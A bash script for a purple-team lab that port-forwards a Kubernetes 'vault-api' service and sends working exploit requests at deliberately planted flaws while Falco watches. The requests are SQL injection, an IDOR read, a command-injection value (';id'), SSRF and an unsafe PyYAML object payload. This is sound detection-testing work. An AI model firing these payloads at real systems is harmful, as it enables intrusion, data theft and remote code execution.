#!/usr/bin/env bash
# Purple-team: exploit each planted flaw against the running deployment.
# Watch Falco (make falco-logs) in another terminal while this runs.
set -u
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
export PATH="$HOME/.local/bin:$PATH"

# Port 18080 avoids clashing with Burp (which owns 8080); --noproxy bypasses any proxy.
kubectl -n vault port-forward svc/vault-api 18080:80 >/tmp/vault-pf.log 2>&1 &
PF=$!; trap 'kill $PF 2>/dev/null' EXIT
sleep 4
B=http://127.0.0.1:18080
curl() { command curl --noproxy '*' "$@"; }

echo "== [SQLi] /notes/search  (returns all rows via injection) =="
curl -s "$B/notes/search?q=x%27%20OR%20%271%27%3D%271" | head -c 400; echo; echo

echo "== [BOLA/IDOR] /notes/2  (reads bob's private note without authz) =="
curl -s "$B/notes/2"; echo; echo

echo "== [CMD INJECTION] /ping?host=127.0.0.1;id  (Falco should ALERT) =="
curl -s "$B/ping?host=127.0.0.1%3Bid" | head -c 400; echo; echo

echo "== [SSRF] /fetch?url=...  (server-side request) =="
curl -s "$B/fetch?url=http://127.0.0.1:8000/health" | head -c 200; echo; echo

echo "== [UNSAFE YAML] /config  (yaml.load on vulnerable PyYAML) =="
curl -s -X POST "$B/config?raw=%21%21python%2Fobject%2Fapply%3Aos.getcwd%20%5B%5D" | head -c 200; echo
